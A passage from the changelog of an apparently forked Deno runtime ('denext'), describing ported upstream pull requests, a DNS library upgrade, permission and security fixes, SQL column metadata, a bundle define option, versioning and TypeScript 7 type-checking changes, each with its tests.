    pull request. A raw pointer argument still points at the buffer itself (the
    pull request refused shared and resizable ones): `Deno.UnsafePointer.of()`
    hands the pointer out, so a copy would be wrong, and a raw pointer creates
    no Rust reference. Tests: `deno_core`
    `test_op_async_buffer_resized_during_op` (an op holding a slice across an
    await while JavaScript shrinks a 16 MiB resizable buffer to 16 bytes),
    `test_op_async_buffer_shared_and_cross_thread`, and the pull request's sync,
    fast-call and `JsBuffer` cases changed from expecting a `TypeError` to
    expecting the write-back; `unit_node/shared_buffer_test.ts`; the regenerated
    `op2` expected outputs; the enabled node_compat `test-crypto-random.js`,
    `test-buffer-sharedarraybuffer.js`, `test-buffer-resizable.js` and the
    worker `SharedArrayBuffer` tests.

71. **`fix(ext/net)`: hickory 0.26 (RUSTSEC-2026-0119)** (`Cargo.toml`,
    `ext/net/ops.rs`, `ext/fetch/dns.rs`, `node:dns`'s `cares_wrap.ts`). Ports
    denoland/deno#36322 (hickory-proto, -resolver and -server 0.26; locked at
    0.26.3). hickory-proto 0.25 encodes names with O(n²) compression
    (RUSTSEC-2026-0119), fixed only in the semver-breaking 0.26 line, so the
    advisory was ignored in item 42; the ignore is gone and `cargo audit`
    passes. The port follows the 0.26 API (`NetError` / `DnsError`,
    `NameServerConfig` with per-protocol `ConnectionConfig`, `Resolver::build()`
    returning a `Result`), and takes the pull request's behaviour fixes: an
    explicit name server (`Resolver.setServers()`) is queried over a connected
    UDP socket so a refused server is `ECONNREFUSED` instead of a timeout, an
    undecodable response is `EBADRESP`, EDNS is sent only when asked for,
    `Deno.resolveDns()` returns only the answer section, and `getServers()`
    keeps the configured order. Merged with this fork's own DNS changes: the
    query name is still parsed up front for an exact `EBADNAME`, the c-ares
    codes (`ENOTFOUND` / `ENODATA`) are read from 0.26's `NoRecords` (a REFUSED
    response, its own variant in 0.26, stays `ENODATA` as it was in 0.25), and
    an `ANY` query still skips record types it cannot format. Tests: `deno_net`
    unit tests (the pull request's answer-section and server-order cases), the
    `test_resolve_dns` integration test on hickory-server 0.26, and the
    `node:dns` unit and node_compat tests. Before: `cargo audit` on the 0.25.2
    lock without the ignore reports RUSTSEC-2026-0119. RUSTSEC-2026-0118 does
    not affect 0.26 either, so `.cargo/audit.toml` no longer ignores any hickory
    advisory.

72. **Upstream batch: `Deno.serve`, runtime crash and correctness pull
    requests** (`feat/upstream-prs-runtime-dd`, on `development-denext`).
    Carried from open denoland/deno pull requests, one commit each with an
    `Original-Author:` trailer and the pull request's head; reviews in the plans
    file `deno-pr-reviews-runtime.md`:
    - `Deno.serve` (HTTP/1.1): a request body read in the background is no
      longer stranded while a streamed response is written (#36974); the
      read-ahead while a response is pending is capped at 64 KiB, so a client
      that keeps sending gets TCP backpressure instead of unbounded buffering
      (#36869, hand-merged after #36974 in `libs/http_h1/conn.rs`); a graceful
      `shutdown()` lets a finite request body finish instead of failing the
      request with a 500 (#36825); malformed, non-ASCII and repeated `Host`
      values get a 400 before the handler runs, in `Deno.serve` and
      `Deno.serveHttp` only (#36481: its current head already dropped the
      `node:http` half its review refused); `DENO_SERVE_ADDRESS` is handed out
      once per process, so a worker's `Deno.serve` binds its own options instead
      of the main server's address or item 1's `memory:` channel (#36760, ported
      onto `ProcessEnvGuard`; its `run_headless_worker` hunk is left out, the
      overlay variable is not inherited);
    - crashes and hangs: chained snapshots keep their inherited extension
      sources (#36911, a deserializer segfault); `node:worker_threads` resource
      limits that overflow are a `RangeError` (#36200); a revoked `Proxy`
      inspects as `<Revoked Proxy>` instead of throwing (#33642, ported to the
      Rust formatter); a polluted `Object.prototype.signal` no longer recurses
      `addEventListener` into a stack overflow (#37037); inspecting an `Event`
      subclass prototype no longer throws (#36509, #36737);
      `a.readable.pipeThrough(b)` no longer deadlocks when written before
      `b.readable` is read (#36819); `deno fmt` no longer runs out of memory on
      conditions that flip each other (#34476, with dprint/dprint#1137 vendored
      as `libs/vendor/dprint-core` 0.67.4 instead of the pull request's git
      dependency on a bot-hosted copy; drop it once dprint-plugin-typescript and
      -markdown are on dprint-core 0.68+);
    - security: a worker's `permissions.import` applies to its static remote
      imports (#35114);
    - correctness: cloned `Request` / `Response` byte bodies no longer share
      storage (#36210); a closed `Deno.watchFs` releases its OS watch at once
      (#36964); setting an event handler attribute to `null` removes its
      listener (#36892); `AbortSignal.timeout()` above 2^31-1 ms is clamped, not
      fired at once (#34153); `deno lint --fix` keeps file modes (#36967);
      `fetch()` sets TCP keepalive on pooled connections (#36549); WebSocket
      frames are flushed to the transport (#36863, fastwebsockets 0.10, already
      in the tree); `URLPattern` full-wildcard named groups keep their names
      (#36916); `--watch` survives a re-raised SIGTERM (#36268, hand-merged into
      the `poll_pending` loop #35607 gave `ext/signals`) and kills `unref()`'d
      children on restart (#36977).

    Carried elsewhere: #33894 (item 69), #36260's ground (item 70), #36971's
    (item 71, hickory 0.26) and #36606 (item 68). Not carried, with the reasons
    in the reviews: #36253 (would drop `ext/sql`'s error fields until it moves
    to `registerErrorBuilder`; both done in item 75), #36429 (Windows, design
    open; carried with our host rule in item 75), #36659 (already fixed in
    v2.9.7; its sync-path hunk would keep an unread body on a kept-alive
    connection), #35422, #36370, #35927, #36989 (a retention leak with
    long-lived signals), #32872 (contradicts the Compression Streams WPT),
    #36763 and #33517 (already in v2.9.7).

    Tests: each pull request's own (`deno_http_h1`, `tests/unit` serve, http,
    body, fetch, streams, event_target, event, console, timers, fs_events,
    urlpattern, websocket and worker suites, `tests/specs` serve, run, worker,
    node, install and fmt, the watcher and lint integration tests); new here:
    the `console_test` revoked-proxy cases. The new serve, body, event, streams,
    timers and fmt tests were run against the `rel/denext22` build first and
    fail there.

73. **laufey `development-denext` host changes** (from `denext.22`; laufey
    `development-denext` `2dd0988`, code at `643a289`, no runtime API).
    - Page-triggered downloads (`<a download>`,
      `Content-Disposition:
      attachment`, blob exports) ask where to save
      with the platform's save dialog on every backend and are cancelled when it
      is dismissed (carried from littledivy/laufey#126). The fork hardens it: a
      download's URL, before and after redirects, must be on an origin the
      window's top-level frame may load (a cross-origin iframe opens no dialog),
      the proposed name is sanitized (no directory part, control or bidi
      characters, reserved Windows names, leading dots; at most 200 bytes), the
      dialog is the backend's own one-at-a-time file dialog, at most 3 save
      dialogs per window in 10 s, and CEF never saves without a path.
    - CEF on Windows keeps an app started elevated (UAC on) elevated
      (`--do-not-de-elevate`) instead of exiting 1 after Chromium's de-elevation
      relaunch, which also lost a cold-start deep link.
    - A deep-link launch keeps CEF's own `--disable-features` defaults, so the
      browser no longer crashes at startup in Chrome's tab code.

    Tests: laufey's downloads e2e on every webview and CEF leg (a blob export
    saved at the chosen path, a traversal name writes only the chosen path, a
    dismissed dialog writes nothing, cross-origin frames and top-level
    cross-origin downloads never reach the dialog) and `cef_network_quiet_test`
    (each CEF default survives an emptied value). This fork's e2e is unchanged.

74. **`test(core)`: deno_core's lib tests run in parallel, and the Windows
    named-pipe busy tests run again** (`libs/core/uv_compat/tests.rs`,
    `libs/core/runtime/tests/snapshot.rs`,
    `.github/workflows/denext_tests_os.yml`). Test-only; no runtime change. The
    `Test core libs` step had run deno_core, serde_v8 and deno_ops on one test
    thread and skipped two Windows tests.
    - The crashes are V8's, not uv_compat's. Core dumps of the suite run in
      parallel (Ubuntu, `RUST_BACKTRACE=full`, `gdb` on the cores) crash in V8's
      read-only heap: SIGSEGVs in `ReadOnlySpace::EnsureSpaceForAllocation`,
      `ReadOnlyPageObjectIterator::Next` (under `Snapshot::Create`),
      `AllocateRawOneByteInternalizedString` and `HeapObject::SizeFromMap`, and
      V8 aborts (SIGTRAP). On Windows the same runs end in
      `STATUS_ACCESS_VIOLATION` or libc++ hardening aborts
      (`STATUS_STACK_BUFFER_OVERRUN`). The crashing thread is a test that
      creates a snapshot (`JsRuntimeForSnapshot`) or, less often, a plain
      `JsRuntime::new` running beside one. `snapshot_test_lock()` keeps two
      snapshot creators apart (denoland/deno_core_revamp#17), but a snapshot
      creator also crashes V8 next to any other isolate in the process. Two
      tests from denoland/deno#36627
      (`shared_array_buffer_available_during_snapshot`,
      `shared_array_buffer_primordial_from_snapshot`) did not take the lock at
      all; they take it now. That alone did not fix it: with the lock on every
      creator, 30 of 30 parallel runs still crashed on Ubuntu and 24 of 30 on
      Windows, each dump showing a lock-holding snapshot test beside ordinary
      runtimes (before, 6 of 15 and 3 of 15). So the step skips the
      snapshot-creating tests (`runtime::tests::snapshot::`,
      `runtime::tests::jsrealm::es_snapshot`,
      `modules::tests::dynamic_imports_snapshot`,
      `modules::tests::import_meta_snapshot`) in the parallel run and runs them
      afterwards on one thread. Products create a snapshot only at build time,
      in a process of its own. The uv_compat tests never crashed: 200 parallel
      runs of them alone passed on Ubuntu, macOS and Windows.
    - The Windows busy tests (`pipe_connect_retries_on_error_pipe_busy`,
      `uv_pipe_connect_busy_then_succeeds`): the test setup was wrong; the retry
      was right. To end the busy state, the tests dropped the only server
      instance (`max_instances(1)`) and created a new one. Tokio closes a named
      pipe handle only once its reactor has seen the pending I/O cancelled, so
      the new `CreateNamedPipeW` still found the one allowed instance and failed
      with `ERROR_PIPE_BUSY` ("All pipe instances are busy"). Waiting for the
      close does not help either: the name then has no instance, and
      `WaitNamedPipeW` fails with `ERROR_FILE_NOT_FOUND`, as it does in libuv. A
      standalone Tokio reproduction on a Windows x64 host showed both outcomes.
      The tests now free the instance the way a server recycles one (disconnect
      the first client, listen again on the same instance). The retry
      (`WaitNamedPipeW`, then `CreateFileW`, looping on a lost race, as libuv's
      `pipe_connect_thread_proc` does) is unchanged. The reproduction passed 20
      of 20; on CI the two tests passed 10 of 10.
    - Two real parallel-test races in uv_compat. The saved termios that
      `uv_tty_reset_mode` restores is process-global, as in libuv, and every TTY
      close takes its spinlock, so `uv_tty_reset_mode` could answer `UV_EBUSY`
      (-16, seen on macOS) or restore another test's terminal. The TTY tests now
      hold one `tokio::sync::Mutex`. `assert_fd_closed` had failed when another
      test reused the closed descriptor number (Ubuntu, 1 run in 18 before the
      fix). It now compares the open file (device and inode from `fstat`)
      recorded before the close.
    - Still open, and not from this change: on macOS a snapshot test can crash
      on one thread too. The base commit failed 4 of 40 runs of the snapshot
      tests on one thread, `es_snapshot` alone 1 of 40, and the whole deno_core
      suite on one thread (the step as it was) 2 of 10. The abort is malloc
      rejecting a `free()` (`find_zone_and_free`, an invalid or double free)
      from `~BackingStore` under `ArrayBufferSweeper` while `JsRuntime`'s drop
      disposes an isolate restored from a snapshot. Linux and Windows do not
      show it. Not yet root-caused.

75. **Upstream batch: security pull requests** (`fix/security-23`, for runtime
    `denext.23`). Carried from open denoland/deno pull requests, one commit each
    with an `Original-Author:` trailer and the pull request's head, with our
    fixes as separate commits after them:
    - a remote module body that fails its checksum is no longer written to the
      HTTP cache, where a later unchecked load would have served it (#36428);
      its red integration test (`jsr::bad_manifest_checksum`) expected the
      rejected bytes to be read back from the cache, and now expects the module
      to be downloaded and checked again;
    - a missing path under a symlink in `node_modules` is resolved through the
      link before the registry read check, so `require()` no longer tells a
      program without `--allow-read` whether a file outside `node_modules`
      exists (#36479); its red spec never reached that code: `require()` of a
      missing package also looks in every ancestor's `node_modules` (as Node
      does), and the first one outside the project needs `--allow-read`, so the
      spec now grants read access to the ancestors' `node_modules` only;
    - `node:fs` `fchmod` / `fchown` / `futimes` (and their sync forms) need
      write access to the path the descriptor was opened with (#36442), which is
      the path its open was checked and resolved to, so a descriptor opened
      through a link names a `--deny-write` target (tested); the pull request's
      test failed on Linux and macOS because a scoped `--allow-run` may not pass
      `LD_LIBRARY_PATH` / `DYLD_*` to the child, so it runs it with `clearEnv`;
    - dependency aliases and workspace package names must be `name` or
      `@scope/name` before an install links them under `node_modules` (no `..`,
      separators, drive or absolute paths, period-prefixed components such as
      `.deno` or `.bin`), so a `package.json` can't make an install write or
      delete outside its package directory (#36103). Upstream's narrower
      [#37047](https://github.com/denoland/deno/pull/37047) (2.9.8: link names
      checked inside `symlink_package_dir`, which now takes the `node_modules`
      directory and the name) merged alongside it at the
      [2.9.8 sync](#upstream-syncs); both checks run, #36103's
      `ensure_safe_package_symlink_path` after upstream's `package_link_path`,
      and #36103 still covers the resolvers and `package.json` validation that
      #37047 does not. Ours: package lookups (byonm, local, global resolvers)
      keep the shape checks but allow a period-prefixed name, which Node's
      CommonJS loader resolves (`require(".multipart/x")`); the pull request
      rejected it there too, which was its red
      `npm::cjs_export_analysis_require_re_export`;
    - an op error of a registered class is built natively on both the slow and
      the fast path from a prototype captured at registration, so a Proxy or
      accessor on `Deno.core.errorConstructors` can't run JavaScript inside a
      fast call (the GHSA-p4r3-6jgx-4cj5 shape), and the class constructor no
      longer runs (#36253). Ours: `Deno.SQL`'s `PostgresError` / `SQLiteError`
      move to `registerErrorBuilder` (as native construction would name them
      `DenoSqlPostgresError` / `DenoSqlSQLiteError`), and `deno_sql`'s two
      fast-compatible ops that return a `SqlError` are `nofast`, since a fast
      call can't run a builder;
    - Windows: a module on a network path (`file://host/share/x.ts`, UNC) is no
      longer loaded with no permission at all (#36429). Our host rule replaces
      the pull request's trusted roots: every kind, roots included (a worker's
      root is chosen by code), needs import access to the host the path names
      (`--allow-import=<host>`, the prompt, `--allow-import` or `-A`; the
      default allow list never matches a share, and `--deny-import=<host>`
      refuses it), and a dependency or dynamic import also needs `--allow-read`,
      as in the pull request; a path with no host (device namespace) needs all
      import access. Its red Windows test expected `file:////server/...` (one
      separator, the current drive's root) to be a share;
    - a Pipe / TCP wrap adopts an untracked descriptor only with all
      permissions, since the descriptor table is shared by every isolate in the
      process; pipes and child stdio created for an isolate are registered for
      it (#36349). Ours: a descriptor received with an IPC message is registered
      for the isolate that read it (a child without `-A` could no longer take a
      server its parent sent), and `dgram`'s `UDP.open(fd)`, which took
      ownership of any descriptor number with no check, follows the same policy.

    Tests: each pull request's own (`deno_cache_dir`, `deno_core` error and
    `error_builder_test.js`, `deno_ops` expected outputs, `deno_io` fd table,
    `deno_permissions`, `deno_resolver` file fetcher and npm path,
    `deno_npm_installer`, `cli/lib` permission checker, `cli/rt` VFS read link,
    `unit_node` fs and child_process, `unit` webgpu, specs
    `npm/require_missing_paths_across_symlinks`,
    `install/package_json_invalid_alias`, `node/pipe_open_fd`); ours:
    `permission/symlink_resolve_deny` (descriptor metadata through a link),
    `sql/sqlite_basic` (an error from `simple()`), `node/pipe_open_fd`
    `isolate_udp_fd_ownership`, `node/child_process_ipc_handle`
    `server_restricted_child_*`, the `unit_node` fd metadata case through a
    link, the resolver lookup unit test, and `deno_permissions`
    `windows_network_path_hosts` /
    `network_file_import_requires_import_access_to_host`. Each new test fails on
    the base, or, for a fix on top of a pull request, on the pull requests alone
    (the CI branches `fix/security-23-before` and `fix/security-23-prs-only`;
    the Windows permission tests on windows-ci). Also: `uv_compat` gains
    `UV_EPERM` / `UV_EEXIST`, so a refused `Pipe` / `TCP` open reports libuv's
    code on Windows too, and #36103's alias check runs before #36469's value
    parser, so `run` / `task` / `cache` refuse an invalid alias as `install`
    does.

76. **`feat(sql)`: `Deno.SQL` result column metadata**
    (`feat/sql-column-metadata`, for runtime `denext.23`; `ext/sql`,
    `cli/tsc/dts/lib.deno_sql.d.ts`, `libs/vendor/tokio-postgres`). Every result
    (objects, `.values()`, `.raw()`, `.simple()`, cursor batches, empty results)
    carries `columns`, a non-enumerable array of one object per result column,
    in order and with duplicate names kept, so `.values()` rows line up with it.
    The shape is a property of the result rather than a `describe(sql)` method
    because it is what an ORM's driver adapter needs from the query it just ran
    (Prisma's `SqlResultSet` is column names, column types and rows from one
    execution; its `pg` adapter reads `fields[].dataTypeID`, its SQLite adapters
    `StatementSync#columns()` / better-sqlite3's `columns()`), and both engines
    already have it at no cost: Postgres describes the result in the
    `RowDescription` it sends with every query, SQLite in the prepared
    statement. A `describe()` would cost a round trip (or a cache to invalidate)
    per query, and can't prepare a named statement behind a transaction-mode
    pooler (`prepare: false`). It follows postgres.js (`result.columns`) and
    `node:sqlite`'s field names.
    - Common fields: `name`, `type` (Postgres' `typname`, `"_int4"` for
      `int4[]`; SQLite's declared type as written), `nullable`, `table`,
      `column`.
    - Postgres (`Deno.SQLPostgresColumn`, from the row description): `typeOid`,
      `typeSchema`, `typeKind` (`simple` / `array` / `enum` / `domain` /
      `composite` / `range` / `multirange` / `pseudo`), `typeModifier`
      (`atttypmod`), `baseType` / `baseTypeOid` (an array's element type, a
      domain's underlying type, a range's or multirange's subtype), `tableOid`
      and `columnNumber` (`pg_attribute.attnum`; `null` for an expression). The
      protocol carries neither the table's or column's name nor nullability, so
      `table`, `column` and `nullable` are `null`; a domain column is described
      by the server as its base type. `.simple()` results name their columns
      only (`typeOid` 0, the rest `null`), since `tokio-postgres` keeps only
      names there.
    - SQLite (`Deno.SQLiteColumn`): `database`, `table` and `column` of the
      column a value comes from (through views and subqueries;
      `sqlite3_column_{database,table,origin}_name`), `type` its declared type
      (as written, SQLite's own type names in capitals), and `nullable` `false`
      when that column is declared NOT NULL (`sqlite3_table_column_metadata`);
      an expression has `null` for all of them. `deno_sql` enables rusqlite's
      `column_metadata` feature (the bundled SQLite is always built with
      `SQLITE_ENABLE_COLUMN_METADATA`).
    - `tokio-postgres` 0.7.18 is vendored in `libs/vendor/tokio-postgres`
      (`[patch.crates-io]`) with one addition, `RowStream::columns()`: an
      unnamed statement (`prepare: false`, cursors) keeps its row description
      inside the stream, so without it a result with no rows could not name its
      columns. Every query now reads its columns from the stream.
    - Fixed on the way: a `json[]` / `jsonb[]` parameter took an element that is
      a JavaScript array as a further dimension (`[{ x: 1 }, [2]]` was
      `{"{\"x\":1}",{"2"}}`, malformed); each element is now one JSON value
      (`params::json_array_literal`). With `prepare: false` the parameter's type
      is not known when it is encoded, so there it is still read as a dimension
      (stringify such an element). A top-level JSON string comes back as a
      JavaScript string, and a string bound to `json` / `jsonb` is JSON text, so
      it has to be sent back as `JSON.stringify(value)`.
    - Values (unchanged, now tested as a matrix both ways, including the second
      round trip of what comes back): `int2` / `int4` / floats as numbers,
      `int8` and `numeric` as strings (`bigint: true`: `int8` as `bigint`),
      `bool`, text types, enums and `uuid` as strings, `json` / `jsonb` parsed,
      `bytea` as `Uint8Array`, `timestamptz` as `Date`, `timestamp` as local
      wall-clock `Date`, `date` as UTC-midnight `Date`, arrays (of any of these,
      enums included) as arrays. SQLite: integers as numbers (beyond 2^53 as
      strings, `bigint: true` as `bigint`), reals as numbers, text as strings,
      blobs as `Uint8Array`; a `Date` parameter is stored as its ISO text, an
      object or array as JSON text, a boolean as 1 / 0.

    Tests: `tests/specs/sql/sqlite_columns` (metadata for tables, joins, views,
    subqueries, expressions, RETURNING, empty results, `.values()`, `.raw()`,
    cursors, `.simple()`, and the type matrix: every kind of parameter into
    every declared type and back), `tests/specs/sql/pg_columns` (metadata with
    prepared and unnamed statements, empty results included, and the type matrix
    with the plain, unnamed and `bigint: true` clients, plus the second round
    trip; needs `DENO_SQL_TEST_POSTGRES_URL`), the typings in
    `tests/specs/sql/types.ts`, and the `deno_sql` unit test
    `json_array_elements_are_json_values` (fails before the `json[]` fix).

77. **laufey on CEF 150** (from `denext.23`; laufey `development-denext`
    `353ba60`, no runtime API). The CEF hosts move from CEF 149.0.5 (Chromium
    149.0.7827.197) to CEF 150.0.21+ga61e9a5 (Chromium 150.0.7871.255) on every
    platform; laufey's Makefile pins each platform's CEF archive by SHA-256. CEF
    150 renamed `CEF_PERMISSION_TYPE_LOCAL_NETWORK_ACCESS` to `..._DEPRECATED`
    (same bit), and the Local Network Access prompt handler takes either name.
    CEF's own `--disable-features` defaults are unchanged from 149, and Chromium
    150 still reads `--do-not-de-elevate` after the command-line hook, so item
    73's elevated launch and deep-link fixes hold. The spellcheck dictionaries
    (item 37) are unchanged: Chromium 150 pins the same hunspell_dictionaries
    commit.

    Tests: laufey's full CI on the commit, this fork's desktop runtime build and
    e2e on every target, and the Windows elevated-launch check (UAC on, an
    interactive session) on Windows arm64, whose CEF host laufey's CI does not
    build.

78. **`feat(bundle)`: `deno bundle --define` and `Deno.bundle({ define })`**
    (`feat/bundle-define`, for runtime `denext.23`; `libs/cli_parser`,
    `ext/bundle`, `cli/tools/bundle`, `cli/tsc/dts/lib.deno.unstable.d.ts`).
    esbuild's `define`: a global identifier or member expression is replaced
    with a constant expression at bundle time, so a branch on it folds and the
    untaken side is dropped (`--minify` removes it entirely). The flag is
    `--define KEY=VALUE` (also `--define=KEY=VALUE`), repeatable, split at the
    first `=`; that is the shape upstream settled on in
    [denoland/deno#30639](https://github.com/denoland/deno/issues/30639) (no
    pull request yet), rather than esbuild's `--define:KEY=VALUE`.
    `Deno.bundle()` takes `define: Record<string, string>`, esbuild's JS API
    shape (each value is source text, so a string is `JSON.stringify(value)`).
    `deno.json` has no `bundle` section, so there is no config key.
    - Names and values are checked by esbuild's rules before esbuild starts
      (`ext/bundle/src/define.rs`, shared by the flag parser, the op and
      `bundle_init`): a name is an identifier that isn't a reserved word (`this`
      and `import.meta` allowed) followed by `.name` or `["string"]` accesses
      (`process.env.NODE_ENV`, `process.env["MY-VAR"]`); a value is an entity
      name (`undefined`, `globalThis.fetch`) or a JSON literal as esbuild reads
      it (single-quoted strings, trailing commas, comments, integer BigInts). A
      bad flag is a usage error naming the define and what is wrong, an empty
      value says to quote a string, and `Deno.bundle()` rejects with a
      `TypeError` (also for a value that isn't a string). Esbuild accepts
      `--define:=1` and ignores it; here an empty name is an error.

    Tests: `tests/specs/bundle/define` (identifiers, JSON and single-quoted
    values, `undefined`; `process.env.NODE_ENV` and `import.meta.env.MODE`
    replaced and gone from the output; a `false` flag's branch and its function
    eliminated under `--minify`; a missing `=`, a bad name, a reserved word, a
    bad value and an empty value each fail), `tests/unit/bundle_test.ts`
    (`define` through `Deno.bundle()`, and its errors), the `define.rs` unit
    tests (every name and value case checked against esbuild 0.25.5's own
    answer) and the parser tests `bundle_define` /
    `bundle_define_rejects_invalid_input`.

79. **`chore(version)`: the fork's own version, 3.0.0-rc.1**
    (`chore/version-3.0.0-rc`; `cli/Cargo.toml`, `cli/rt/Cargo.toml`,
    `cli/lib/version.txt`, `cli/lib/upstream_version.txt`, `cli/lib/build.rs`,
    `cli/lib/version.rs`, `cli/standalone/binary.rs`,
    `cli/tools/installer/mod.rs`, `cli/tools/upgrade.rs`, `cli/tsc/native.rs`,
    `.github/workflows/denext_runtime.yml`, `.github/denext-runtime/`). The
    release that was going to be `denext.23` is `3.0.0-rc.1`; see
    [Versioning](#versioning) for the scheme and what still uses the upstream
    version. Besides the version itself:
    - a release build is the one whose `DENEXT_VERSION` IS its version (it used
      to have to extend it), so `deno compile` keeps taking the release's
      `denort`;
    - `deno upgrade` and the update check are off in a release build (they would
      have offered upstream's release-candidate channel, or stock Deno, in place
      of the fork);
    - denext's toolchain cache is searched newest first by semver, not by name
      (`3.0.0-rc.10` after `3.0.0-rc.9`; by name `2.9.7-denext.9` sorted after
      `2.9.7-denext.10`);
    - the release workflow names every archive after the fork's version, takes a
      tag only when it is exactly that version, and records the upstream version
      as `deno.version` in `BUILD_INFO.json` / `manifest.json`; `cli_smoke.sh`
      checks that `deno upgrade` refuses.

    Tests: `denext_version_is_or_extends_the_deno_version`,
    `fork_versions_are_semver_and_sort_after_the_old_scheme` and
    `the_release_channel_is_the_upstream_versions` (`cli/lib/version.rs`),
    `deno_land_downloads_name_the_upstream_release` and
    `denext_denort_is_the_release_asset` (`cli/standalone/binary.rs`),
    `denext_release_builds_refuse_upstream_upgrades` (`cli/tools/upgrade.rs`),
    `toolchain_cache_is_ordered_by_semver` (`cli/tsc/native.rs`) and the spec
    test `install::package_json_engines::match_silent`
    (`engines.deno:
    ">=1.0.0"` warned against `3.0.0-rc.1`).

80. **`fix(permissions)`: the network clients that skipped the deny rules**
    (`fix/dns-deny-gaps`, for runtime `denext.23`; `ext/kv/remote.rs`,
    `ext/fetch/dns.rs`, `ext/cron/handler_impl.rs`, `runtime/worker.rs`,
    `runtime/web_worker.rs`). The adapt of
    [denoland/deno#30085](https://github.com/denoland/deno/pull/30085) (deny
    check before and after DNS resolution): fetch, WebSocket, `ext/net`,
    `node:net` and `Deno.SQL` already re-check `--deny-net` against the
    addresses a host resolves to. An audit of every other client the runtime
    opens connections with found three that user code could point somewhere it
    may not connect:
    - **Remote KV** built its HTTP client with no permissions, so the
      hostname-level `check_net_url` (on the URL passed to `Deno.openKv` and, in
      `denokv_remote`, on each database URL the metadata endpoint returns) was
      the only check: a name resolving to a denied or internal address got
      through, and a KV Connect server could point KV traffic at one. The client
      now runs the resolved-address check on every connection (the metadata
      exchange, its refreshes, and every data path call). Because
      `denokv_remote` retries a failed data path call forever, the transport
      records a denied origin and the permission checker reports it on the next
      attempt, so the read or write rejects with `NotCapable` instead of
      hanging; `Deno.openKv` itself rejects with `NotCapable` when the metadata
      endpoint is refused, and checks every database URL the metadata names at
      open time. `ext/fetch/dns.rs` keeps the permission error inside its
      `io::Error` (same message) so `find_resolved_deny_error` can find it in a
      send error's source chain.
    - **`DENO_UNSTABLE_CRON_SOCK`** was read again whenever a `Worker` was
      created, and the cron socket handler connects as soon as it exists, with
      no permission check. With `--allow-env` but no `--allow-net`,
      `Deno.env.set()` followed by `new Worker(...)` opened a TCP, Unix or vsock
      connection to any address.
    - **`DENO_CACHE_LSC_ENDPOINT`** likewise: a worker's `caches` sent HTTP
      requests (with the cached bodies and the token) to whatever endpoint the
      variable named when the worker started.

    Both variables are Deno Deploy operator configuration, so they are now read
    once, when the first main worker is created (before any user code runs, and
    after a pre-warmed runtime's host has set them), and every later worker uses
    that snapshot (`deno_runtime::worker::deploy_env`). The remaining clients
    built without permissions can't be steered by the program: the CLI's own
    module, npm, JSR, publish, upgrade and LSP fetches (module loads are checked
    against `--deny-import`), the OpenTelemetry exporter and the permission
    broker (environment read at process start), the inspector (a listener), and
    the desktop dev tooling and scheme bridge (fixed loopback addresses). Tests:
    `permission/deny_net_kv_remote_resolved_ip` (a metadata endpoint, and a
    database URL from the metadata, reached through `localhost` under a
    port-scoped `--deny-net=127.0.0.1:<port>`: both reject with `NotCapable` and
    neither server is reached), `permission/deploy_env_set_at_runtime` (both
    variables set at runtime and a worker started: no connection; control: the
    cron socket set at startup is still dialed) and
    `test_resolved_deny_error_is_found_in_the_send_error` in
    `ext/fetch/tests.rs`.
81. **`feat(check)`: TypeScript 7 everywhere (phase 3), and closing tsgo LSP
    gaps** (from `denext.23`; `feat/ts7-phase3`, CLI only;
    `cli/type_checker.rs`, `cli/tools/check.rs`, `cli/tools/installer/local.rs`,
    `cli/tools/bundle/mod.rs`, `cli/util/file_watcher.rs`, `cli/lsp/tsgo.rs`,
    `cli/lsp/ts_server.rs`, `cli/lsp/language_server.rs`). Item 47 made the
    native compiler the default for every command that type-checks; this closes
    what still fell back.
    - **Doc tests and `check --doc` natively.** The code blocks
      `deno test
      --doc` and `deno check --doc` / `--doc-only` extract
      (`file:///a/mod.ts#3-7.ts`) live in memory, where the compiler can't read
      them, so item 47 kept them on the in-process TypeScript 6.0.3. Now
      `run_native_check` writes each block to a fresh directory under the
      project's generated `.deno/doc/` (inside the project, so the generated
      `paths` and `node_modules` resolve for it as for any module), with its
      local imports (relative ones and the absolute `file:` import of the module
      it documents) rewritten relative to the written file on their own line
      only, adds the files to the run's `files`, hands the blocks' external
      imports (`jsr:`, `npm:`, import-map keys) to the config generator
      (`sync_types_command`'s new `extra_specifiers`, which reads the project
      from disk and never saw them), and reports a diagnostic in a block against
      the block's specifier, as the in-process checker does; the directory is
      removed when the check ends. `deno check --doc` goes through
      `TypeChecker::check_graph` like `deno test`, so the engine switch and the
      fallback apply to it too. A block of a remote module (no file to write it
      beside) keeps the in-process checker.
    - **`--watch`.** The native check writes `.deno/` into the project (the
      generated config on a cache miss, and now the doc blocks), which a watcher
      observing the project directory (`test` / `bench --watch` on a directory)
      took for a change and restarted on. The watcher now drops events inside a
      generated `.deno/` (one whose `.gitignore` is the generator's `*`; a
      user's own `.deno/` is still watched).
    - **`deno bundle --check`.** `deno bundle` turns on sloppy imports for its
      own (bundler) resolution, and item 47 kept every sloppy-imports graph
      in-process, so `bundle --check` never checked natively. The command now
      marks the setting as its own (`InternalFlags::implied_sloppy_imports`):
      only sloppy imports the user asked for (`--unstable-sloppy-imports`,
      `"unstable": ["sloppy-imports"]`) keep the in-process checker; the
      generated project's `moduleResolution: "bundler"` resolves an
      extensionless import as the bundler does.
    - **The engine switch and the fallback** are item 47's:
      `DENO_CHECK_ENGINE=tsc` or `--check-engine=tsc` keeps TypeScript 6.0.3 for
      every command, and a graph the generated stock project can't express falls
      back with one debug record (`Type checking in-process: <reason>`).
      `deno publish` keeps the slow-types check (Deno's own, engine-independent)
      and still skips the extra in-process check of the in-memory fast-check
      output under the native engine, now with a debug record. Still in-process:
      declaration emit (`deno bundle --declaration`,
      `deno transpile --declaration`), a worker's graph, and item 47's other
      fallback cases.
    - **LSP (item 46, `TsServer::Go`).** `deno sync-types` writes the built-in
      `vitest` / `vite-plus/test` / `@jest/globals` types and their `paths`
      (unless `test.vitestCompat` is `false`), which the tsgo backend reads, so
      a test file no longer shows TS2307 for an uninstalled `vitest`. Semantic
      tokens come from tsgo (`textDocument/semanticTokens/full` and `/range`):
      Deno declares the capability to tsgo with its own legend and re-encodes
      tsgo's tokens against `semantic_tokens::get_legend()` by type and modifier
      name, dropping a type Deno's legend lacks. tsgo's
      `workspace/diagnostic/refresh` is no longer just acked: it makes Deno
      diagnose its documents again (once per burst, through the language
      server's task queue; a pull client gets `workspace/diagnostic/refresh`).
      An external import tsgo reports unresolved (TS2307 / TS2792 for a `jsr:` /
      `npm:` / bare specifier, typically one added by an edit whose package Deno
      has cached already) re-runs `deno sync-types` in the background once per
      specifier until the next cache or config change, then diagnoses again; the
